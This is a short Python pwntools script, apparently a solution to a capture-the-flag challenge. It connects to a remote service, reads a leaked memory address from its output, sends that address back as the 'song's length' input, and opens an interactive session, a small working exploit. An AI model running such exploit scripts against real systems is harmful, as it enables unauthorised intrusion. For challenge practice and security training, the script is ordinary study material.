from pwn import *

p = remote("94.237.55.15", 34780)

p.recvuntil(b"0x")
addr = int(p.recvuntil(b"\x08").rstrip(b"\x08"), 16)
print(f"{hex(addr) = }")

p.recvuntil(b"Give me the song\'s length: ")

print(p)

p.sendline(bytes(str(addr), "utf-8"))

p.interactive()

# while True:
#     print(p.recvline())
